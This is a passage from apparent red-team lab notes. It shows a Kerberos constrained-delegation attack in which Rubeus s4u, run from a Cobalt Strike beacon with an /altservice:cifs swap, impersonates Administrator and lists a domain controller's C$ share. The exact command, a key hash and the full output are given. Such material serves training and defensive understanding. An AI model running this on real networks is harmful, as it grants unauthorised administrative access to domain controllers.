The eventlog service on DC-2 is not immediately useful for lateral movement, but the service name is not validated in s4u. This means we can request a TGS for any service run by **DC-2$**, using `/altservice` flag in Rubeus.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[+] Sequence number is: 1421721239
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfj [...snip...] WLTIk

[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.dev.cyberbotic.io'
[*]   Final tickets will be for the alternate services 'cifs'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2proxy request for service: 'eventlog/dc-2.dev.cyberbotic.io'
[+] Sequence number is: 1070349348
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGvD [...snip...] ljLmlv

[+] Ticket successfully imported!

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```